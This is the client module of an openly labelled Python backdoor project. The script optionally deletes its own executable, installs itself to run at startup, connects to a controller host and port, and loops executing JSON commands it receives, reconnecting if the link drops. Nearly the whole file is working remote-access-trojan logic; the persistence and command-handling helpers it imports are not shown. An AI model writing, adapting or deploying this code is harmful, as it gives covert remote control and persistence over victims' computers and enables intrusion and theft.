"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import socket
import sys

from src.client import persistence
from src.client.command_handler import CommandHandler
from src.client.socket import Socket


class Client:
    def __init__(self, host, port, add_to_startup=False, melt=False):
        if melt:
            persistence.melt()

        if add_to_startup:
            try:
                persistence.add_startup()
            except Exception:
                pass

        self.socket = Socket(host, port)
        self.socket.connect()

        try:
            ch = CommandHandler(self.socket)

            while True:
                msg = self.socket.recv_json()
                ch.parse(msg)

        except socket.error:  # if the server closes without warning
            self.socket.close()
            del self.socket
            self.__init__(host, port)


if __name__ == "__main__":
    if persistence.is_duplicate_instance():
        sys.exit(0)

    # strHost = socket.gethostbyname("")
    Client("127.0.0.1", 3000, False, False)
